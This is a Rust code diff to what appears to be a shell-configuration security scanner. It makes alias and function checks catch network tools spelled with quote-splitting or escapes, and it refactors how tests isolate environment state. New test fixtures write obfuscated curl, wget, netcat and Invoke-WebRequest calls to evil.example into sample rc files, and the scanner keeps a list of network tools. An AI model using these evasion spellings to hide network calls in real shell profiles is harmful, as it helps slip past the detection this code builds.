@@ -1164,7 +1164,7 @@ fn classify_entry(entry: &AliasEntry, out: &mut Vec<AliasFinding>) {
                 kind: entry.kind,
                 shell: entry.shell,
                 location: location.clone(),
-                detail: format!("body invokes `{tool}` (network call)"),
+                detail: format!("body invokes `{}` (network call)", tool),
             });
         }
 
@@ -1218,16 +1218,29 @@ fn body_network_tool(body: &str, shell: AliasShell) -> Option<String> {
         "curl",
         "wget",
     ];
+
+    // Classify the spelling the selected shell executes, not the raw rc-file
+    // bytes. Shells concatenate adjacent quoted/unquoted fragments and remove
+    // escapes, so `c"ur"l`, `w\get`, and PowerShell backtick spellings name the
+    // same tools as their plain forms. Normalize once for the complete retained
+    // body: the canonical normalizer is linear and its output is bounded by the
+    // input body, rather than allocating a projection once per candidate tool.
+    let shell_type = match shell {
+        AliasShell::Bash | AliasShell::Zsh => crate::tokenize::ShellType::Posix,
+        AliasShell::Fish => crate::tokenize::ShellType::Fish,
+        AliasShell::PowerShell => crate::tokenize::ShellType::PowerShell,
+    };
+    let mut effective = crate::rules::command::normalize_shell_token(body, shell_type);
     if matches!(shell, AliasShell::PowerShell) {
-        let lowered = body.to_ascii_lowercase();
+        effective.make_ascii_lowercase();
         return PS_TOOLS
             .iter()
-            .find(|&&tool| contains_command_word(&lowered, tool))
+            .find(|&&tool| contains_command_word(&effective, tool))
             .map(|tool| (*tool).to_string());
     }
     TOOLS
         .iter()
-        .find(|&&tool| contains_command_word(body, tool))
+        .find(|&&tool| contains_command_word(&effective, tool))
         .map(|tool| (*tool).to_string())
 }
 
@@ -1551,36 +1564,6 @@ mod tests {
     }
 
     #[cfg(unix)]
-    struct EnvVarGuard {
-        name: &'static str,
-        previous: Option<std::ffi::OsString>,
-    }
-
-    #[cfg(unix)]
-    impl EnvVarGuard {
-        fn set(name: &'static str, value: impl AsRef<std::ffi::OsStr>) -> Self {
-            let previous = std::env::var_os(name);
-            // SAFETY: every caller holds the crate-wide TEST_ENV_LOCK until this
-            // guard restores the previous value in Drop.
-            unsafe { std::env::set_var(name, value) };
-            Self { name, previous }
-        }
-    }
-
-    #[cfg(unix)]
-    impl Drop for EnvVarGuard {
-        fn drop(&mut self) {
-            // SAFETY: the owning test still holds TEST_ENV_LOCK.
-            unsafe {
-                match &self.previous {
-                    Some(value) => std::env::set_var(self.name, value),
-                    None => std::env::remove_var(self.name),
-                }
-            }
-        }
-    }
-
-    #[cfg(unix)]
     fn shell_quote(path: &Path) -> String {
         format!("'{}'", path.display().to_string().replace('\'', "'\"'\"'"))
     }
@@ -1612,12 +1595,11 @@ mod tests {
     #[cfg(unix)]
     #[test]
     fn runtime_alias_probes_reject_path_shadows_and_ignore_bash_env() {
-        let _lock = crate::TEST_ENV_LOCK
-            .lock()
-            .unwrap_or_else(|poisoned| poisoned.into_inner());
+        let mut global = tirith_test_support::GlobalStateGuard::new()
+            .expect("isolate process-global alias test state");
         let temporary = tempfile::Builder::new()
             .prefix("tirith-alias-shadow-")
-            .tempdir_in(home::home_dir().expect("test account home"))
+            .tempdir_in(&global.roots().home)
             .unwrap();
         let shadow_bin = temporary.path().join("shadow-bin");
         std::fs::create_dir(&shadow_bin).unwrap();
@@ -1626,22 +1608,20 @@ mod tests {
         for shell in ["bash", "zsh", "fish"] {
             write_marker_executable(&shadow_bin.join(shell), &shadow_marker);
         }
-        {
-            let inherited = std::env::var_os("PATH").unwrap_or_default();
-            let mut path_entries = vec![shadow_bin.clone()];
-            path_entries.extend(std::env::split_paths(&inherited));
-            let shadow_path = std::env::join_paths(path_entries).unwrap();
-            let _path = EnvVarGuard::set("PATH", shadow_path);
-            for (shell, args) in [
-                ("bash", &["--norc", "--noprofile", "-c", "alias"][..]),
-                ("zsh", &["-f", "-c", "alias"][..]),
-                ("fish", &["--no-config", "-c", "functions --names"][..]),
-            ] {
-                assert!(
-                    matches!(run_no_rc(shell, args), RuntimeOutcome::Unsupported),
-                    "PATH-shadowed {shell} must be refused before execution"
-                );
-            }
+        let inherited = std::env::var_os("PATH").unwrap_or_default();
+        let mut path_entries = vec![shadow_bin.clone()];
+        path_entries.extend(std::env::split_paths(&inherited));
+        let shadow_path = std::env::join_paths(path_entries).unwrap();
+        global.set_env("PATH", shadow_path);
+        for (shell, args) in [
+            ("bash", &["--norc", "--noprofile", "-c", "alias"][..]),
+            ("zsh", &["-f", "-c", "alias"][..]),
+            ("fish", &["--no-config", "-c", "functions --names"][..]),
+        ] {
+            assert!(
+                matches!(run_no_rc(shell, args), RuntimeOutcome::Unsupported),
+                "PATH-shadowed {shell} must be refused before execution"
+            );
         }
         assert!(
             !shadow_marker.exists(),
@@ -1660,8 +1640,8 @@ mod tests {
         .unwrap();
         let trusted_path = std::env::join_paths([Path::new("/bin"), Path::new("/usr/bin")])
             .expect("construct fixed system PATH");
-        let _path = EnvVarGuard::set("PATH", trusted_path);
-        let _bash_env = EnvVarGuard::set("BASH_ENV", &bash_env);
+        global.set_env("PATH", trusted_path);
+        global.set_env("BASH_ENV", &bash_env);
         assert!(
             matches!(
                 run_no_rc("bash", &["--norc", "--noprofile", "-c", "alias"]),
@@ -1839,6 +1819,74 @@ mod tests {
             .expect("expected network-call finding");
         assert!(f.is_high());
         assert!(f.detail.contains("curl"));
+    }
+
+    #[test]
+    fn shell_effective_network_names_fire_for_aliases_and_functions() {
+        let home = tempdir().unwrap();
+        write(
+            home.path(),
+            ".bashrc",
+            "alias deploy='c\"ur\"l https://evil.example/a'\nfetch() { /usr/bin/w\\get https://evil.example/b; }\n",
+        );
+        write(
+            home.path(),
+            ".config/fish/config.fish",
+            "function relay\n  n\"ca\"t evil.example 4444\nend\n",
+        );
+        write(
+            home.path(),
+            "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
+            "function Get-Payload { I\"nvoke-Web\"Request https://evil.example/c }\n",
+        );
+
+        let scan = scan_with_root(home.path(), false);
+        let network_names: Vec<&str> = scan
+            .findings
+            .iter()
+            .filter(|finding| finding.rule_id == RuleId::AliasContainsNetworkCall)
+            .map(|finding| finding.name.as_str())
+            .collect();
+        for expected in ["deploy", "fetch", "relay", "Get-Payload"] {
+            assert!(
+                network_names.contains(&expected),
+                "shell-effective network command for {expected} was missed: {network_names:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_effective_network_matching_keeps_exact_word_boundaries() {
+        for (body, shell) in [
+            (r#"echo c"ur"ling"#, AliasShell::Bash),
+            (r#"echo se\curely"#, AliasShell::Zsh),
+            (r#"echo n"ca"talogue"#, AliasShell::Fish),
+            (
+                r#"Write-Output I"nvoke-Web"Requesting"#,
+                AliasShell::PowerShell,
+            ),
+        ] {
+            assert_eq!(
+                body_network_tool(body, shell),
+                None,
+                "a longer normalized word must remain benign: {body:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shell_effective_network_matching_decodes_native_escape_forms() {
+        assert_eq!(
+            body_network_tool(r#"c\url https://evil.example"#, AliasShell::Bash),
+            Some("curl".to_string())
+        );
+        assert_eq!(
+            body_network_tool(
+                r#"Invoke-`WebRequest https://evil.example"#,
+                AliasShell::PowerShell,
+            ),
+            Some("invoke-webrequest".to_string())
+        );
     }
 
     #[test]
